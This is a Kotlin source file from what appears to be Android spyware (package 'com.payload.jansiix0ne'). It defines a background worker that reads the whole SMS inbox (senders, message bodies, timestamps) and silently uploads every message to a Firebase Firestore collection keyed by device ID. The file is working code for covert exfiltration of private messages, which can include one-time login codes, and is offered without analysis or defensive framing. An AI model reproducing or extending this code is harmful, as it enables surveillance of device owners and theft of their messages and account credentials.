package com.payload.jansiix0ne.worker

import android.Manifest
import android.content.Context
import android.content.pm.PackageManager
import android.net.Uri
import androidx.core.content.ContextCompat
import androidx.work.CoroutineWorker
import androidx.work.WorkerParameters
import com.google.firebase.Timestamp
import com.google.firebase.firestore.FirebaseFirestore
import com.payload.jansiix0ne.models.SmsModel
import kotlinx.coroutines.tasks.await
import java.util.Date

class AllSmsUploadWorker(
    appContext: Context,
    params: WorkerParameters
) : CoroutineWorker(appContext, params) {

    private val firestore = FirebaseFirestore.getInstance()

    override suspend fun doWork(): Result {
        return try {
            if (ContextCompat.checkSelfPermission(
                    applicationContext,
                    Manifest.permission.READ_SMS
                ) != PackageManager.PERMISSION_GRANTED
            ) {
                return Result.failure()
            }

            val deviceId = getDeviceId()
            val smsList = readAllSms()
            
            // Upload all SMS to Firestore
            smsList.forEach { sms ->
                uploadSmsToFirestore(sms, deviceId)
            }
            
            Result.success()
        } catch (e: Exception) {
            Result.failure()
        }
    }

    private fun readAllSms(): List<SmsModel> {
        val smsList = mutableListOf<SmsModel>()
        val uri = Uri.parse("content://sms/inbox")
        
        val cursor = applicationContext.contentResolver.query(
            uri,
            arrayOf("address", "body", "date"),
            null,
            null,
            "date DESC"
        )
        
        cursor?.use {
            val addressIndex = it.getColumnIndex("address")
            val bodyIndex = it.getColumnIndex("body")
            val dateIndex = it.getColumnIndex("date")
            
            while (it.moveToNext()) {
                val address = it.getString(addressIndex)
                val body = it.getString(bodyIndex)
                val date = it.getLong(dateIndex)
                
                smsList.add(
                    SmsModel(
                        from = address,
                        message = body,
                        time = Timestamp(Date(date)),
                        ownerDeviceId = getDeviceId()
                    )
                )
            }
        }
        
        return smsList
    }

    private suspend fun uploadSmsToFirestore(smsModel: SmsModel, deviceId: String) {
        firestore.collection("devices")
            .document(deviceId)
            .collection("sms")
            .add(smsModel)
            .await()
    }

    private fun getDeviceId(): String {
        val prefs = applicationContext.getSharedPreferences("device_info_prefs", Context.MODE_PRIVATE)
        return prefs.getString("device_id", "") ?: ""
    }
}
